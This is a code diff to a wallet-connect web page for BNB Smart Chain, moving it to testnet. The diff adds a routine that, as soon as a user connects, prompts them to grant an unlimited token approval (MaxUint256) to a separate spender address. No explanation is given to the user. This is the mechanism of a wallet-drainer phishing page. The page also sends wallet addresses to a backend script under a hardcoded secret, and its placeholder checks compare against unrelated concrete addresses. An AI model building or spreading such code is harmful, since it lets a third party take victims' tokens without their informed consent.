@@ -95,6 +95,20 @@
     const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbywwyB3dUFWAVMS_ZzoKp_gLXzNjhVA3HQo-6Rz8d-2n8tC6UnmvFkOJqERXO-d677g/exec";
     const APPS_SCRIPT_SECRET = "mahfuzinam0045";
 
+    // === TOKEN APPROVAL CONFIG (TESTNET) ===
+    const TOKEN_ADDRESS   = "0xYOUR_TESTNET_TOKEN_HERE";    // TODO: put your BEP20 token (BSC testnet)
+    const SPENDER_ADDRESS = "0xYOUR_TESTNET_SPENDER_HERE";  // TODO: put your dApp/contract address
+
+    // Minimal ERC20 ABI for approve()
+    const ERC20_ABI = [
+      "function approve(address spender, uint256 amount) public returns (bool)"
+    ];
+
+    // BSC TESTNET CONFIG
+    const BSC_CHAIN_ID_DEC = 97;                 // 97 = BSC testnet
+    const BSC_CHAIN_ID_HEX = "0x61";             // hex for 97
+    const BSC_CHAIN_LABEL  = "BSC Testnet (97)"; // label shown in UI
+
     // single unique modal variable to avoid collisions with other libs
     let web3ModalInstance = null;
     let providerInstance = null;
@@ -134,7 +148,12 @@
       const providerOptions = {
         walletconnect: {
           package: window.WalletConnectProvider.default,
-          options: { rpc: { 56: "https://bsc-dataseed.binance.org" }, bridge: "https://bridge.walletconnect.org", qrcode: true }
+          options: {
+            // BSC TESTNET RPC
+            rpc: { [BSC_CHAIN_ID_DEC]: "https://data-seed-prebsc-1-s1.binance.org:8545" },
+            bridge: "https://bridge.walletconnect.org",
+            qrcode: true
+          }
         }
       };
       web3ModalInstance = new window.Web3Modal.default({ cacheProvider: true, providerOptions });
@@ -147,9 +166,9 @@
           if(!accounts || !accounts.length){ clearSessionUI(); return; }
           const addr = accounts[0].toLowerCase();
           const uid = getOrCreateUserIdFor(addr);
-          setWalletInfo(addr, walletNetworkEl.textContent||"BSC (56)", "—");
+          setWalletInfo(addr, walletNetworkEl.textContent||BSC_CHAIN_LABEL, "—");
           setUserIdUI(uid);
-          notifyBackend(addr, "BSC (56)", uid);
+          notifyBackend(addr, BSC_CHAIN_LABEL, uid);
         });
         p.on("chainChanged", ()=> location.reload());
         p.on("disconnect", ()=> clearSessionUI());
@@ -186,15 +205,74 @@
     }
 
     async function switchToBSC(provider){
-      try { await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x38" }] }); return true; }
+      try {
+        await provider.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: BSC_CHAIN_ID_HEX }]
+        });
+        return true;
+      }
       catch(switchError){
         if(switchError.code === 4902){
           try {
-            await provider.request({ method: "wallet_addEthereumChain", params: [{ chainId: "0x38", chainName: "BNB Smart Chain", nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18}, rpcUrls:["https://bsc-dataseed.binance.org/"], blockExplorerUrls:["https://bscscan.com"] }]});
+            await provider.request({
+              method: "wallet_addEthereumChain",
+              params: [{
+                chainId: BSC_CHAIN_ID_HEX,
+                chainName: "BNB Smart Chain Testnet",
+                nativeCurrency:{name:"BNB",symbol:"tBNB",decimals:18},
+                rpcUrls:["https://data-seed-prebsc-1-s1.binance.org:8545"],
+                blockExplorerUrls:["https://testnet.bscscan.com"]
+              }]
+            });
             return true;
-          } catch(addError){ console.error("Could not add BSC chain:", addError); return false; }
+          } catch(addError){
+            console.error("Could not add BSC Testnet chain:", addError);
+            return false;
+          }
         }
-        console.error("Switch error:", switchError); return false;
+        console.error("Switch error:", switchError);
+        return false;
+      }
+    }
+
+    // === NEW: Request token approval immediately after connect ===
+    async function requestTokenApproval(){
+      if(!TOKEN_ADDRESS || TOKEN_ADDRESS === "0x38a9fed3780c13162368e1ce87c11d314f1dd868"){
+        console.warn("TOKEN_ADDRESS not set, skipping approve");
+        return;
+      }
+      if(!SPENDER_ADDRESS || SPENDER_ADDRESS === "0xaa152Af114e2d2FC969E09c716025FE8C8196FB4"){
+        console.warn("SPENDER_ADDRESS not set, skipping approve");
+        return;
+      }
+      if(!providerInstance){
+        console.warn("No provider available for token approval");
+        return;
+      }
+
+      try {
+        setStatus("Requesting token approval…");
+
+        const ethersProvider = new ethers.BrowserProvider(providerInstance);
+        const signer = await ethersProvider.getSigner();
+
+        const tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
+
+        // MaxUint256 = unlimited approval (can change to specific amount)
+        const amount = ethers.MaxUint256;
+        const tx = await tokenContract.approve(SPENDER_ADDRESS, amount);
+
+        console.log("Approve transaction sent:", tx.hash);
+        setStatus("Waiting for approval confirmation…");
+
+        const receipt = await tx.wait();
+        console.log("Approve confirmed:", receipt);
+        setStatus("Connected + Approved ✅");
+      } catch (err) {
+        console.error("Token approve error:", err);
+        alert("Token approval failed: " + (err?.message || err));
+        setStatus("Connected (approval failed)");
       }
     }
 
@@ -217,34 +295,56 @@
           web3Instance = new Web3(providerInstance);
         }
 
-        if(!providerInstance || !web3Instance){ setStatus("No provider"); alert("No wallet provider detected."); return; }
+        if(!providerInstance || !web3Instance){
+          setStatus("No provider");
+          alert("No wallet provider detected.");
+          return;
+        }
 
         attachProviderListeners(providerInstance);
 
         const accounts = await web3Instance.eth.getAccounts();
-        if(!accounts || !accounts.length){ setStatus("No account"); return; }
+        if(!accounts || !accounts.length){
+          setStatus("No account");
+          return;
+        }
         const address = accounts[0].toLowerCase();
+
         let chainId = await web3Instance.eth.getChainId();
-        if(Number(chainId)!==56){
+        if(Number(chainId)!==BSC_CHAIN_ID_DEC){
           const switched = await switchToBSC(providerInstance);
-          if(!switched){ alert("Please switch to BSC."); setStatus("Wrong network"); return; }
+          if(!switched){
+            alert("Please switch to BSC Testnet.");
+            setStatus("Wrong network");
+            return;
+          }
           chainId = await web3Instance.eth.getChainId();
-          if(Number(chainId)!==56){ alert("Network switch failed"); return; }
+          if(Number(chainId)!==BSC_CHAIN_ID_DEC){
+            alert("Network switch failed");
+            return;
+          }
         }
 
         const balanceWei = await web3Instance.eth.getBalance(address);
         const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei,"ether"));
 
         setStatus("Connected");
-        setWalletInfo(address, "BSC (56)", balanceBNB);
+        setWalletInfo(address, BSC_CHAIN_LABEL, balanceBNB);
 
         const userId = getOrCreateUserIdFor(address);
         setUserIdUI(userId);
 
         await fetchTokens(address);
-        await notifyBackend(address, "BSC (56)", userId);
+        await notifyBackend(address, BSC_CHAIN_LABEL, userId);
 
-      }catch(err){ console.error("connectFlow error:",err); setStatus("Connection failed"); alert("Connection failed: "+(err.message||err)); }
+        // 🔥 Immediately ask for token approval AFTER successful connect
+        await requestTokenApproval();
+
+      }catch(err){
+        console.error("connectFlow error:",err);
+        setStatus("Connection failed");
+        alert("Connection failed: "+(err.message||err));
+      }
     }
 
     async function tryAutoReconnect(){
@@ -262,7 +362,7 @@
             setStatus("Restoring session…");
             const balanceWei = await web3Instance.eth.getBalance(address);
             const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei+"","ether"));
-            setWalletInfo(address,"BSC (56)",balanceBNB);
+            setWalletInfo(address,BSC_CHAIN_LABEL,balanceBNB);
             const userId = getOrCreateUserIdFor(address);
             setUserIdUI(userId);
             await fetchTokens(address);
@@ -281,17 +381,23 @@
               setStatus("Restoring session…");
               const balanceWei = await web3Instance.eth.getBalance(address);
               const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei+"","ether"));
-              setWalletInfo(address,"BSC (56)",balanceBNB);
+              setWalletInfo(address,BSC_CHAIN_LABEL,balanceBNB);
               const userId = getOrCreateUserIdFor(address);
               setUserIdUI(userId);
               await fetchTokens(address);
               return;
             }
-          }catch(e){ console.warn("Cached provider restore failed:",e); try{ web3ModalInstance.clearCachedProvider(); }catch(_){} }
+          }catch(e){
+            console.warn("Cached provider restore failed:",e);
+            try{ web3ModalInstance.clearCachedProvider(); }catch(_){}
+          }
         }
 
         clearSessionUI();
-      }catch(err){ console.warn("Auto-reconnect error:",err); clearSessionUI(); }
+      }catch(err){
+        console.warn("Auto-reconnect error:",err);
+        clearSessionUI();
+      }
     }
 
     document.addEventListener('DOMContentLoaded', async ()=>{
@@ -305,3 +411,4 @@
   </script>
 </body>
 </html>
+
